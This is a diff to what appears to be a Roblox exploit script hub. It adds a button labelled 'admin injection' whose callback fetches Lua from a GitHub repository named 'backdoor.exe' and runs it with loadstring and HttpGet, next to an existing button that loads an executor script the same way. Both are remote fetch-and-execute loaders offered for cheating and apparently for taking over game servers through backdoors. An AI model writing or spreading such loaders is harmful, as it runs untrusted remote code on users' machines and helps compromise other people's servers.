@@ -96,6 +96,12 @@ Tab:AddButton({
     loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
     end
 })
+Tab:AddButton({
+    Name ="管理员注入",
+    Callback = function()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua'),true))()
+    end
+})
 
 local Tab = Window:MakeTab({
     Name = "通用",
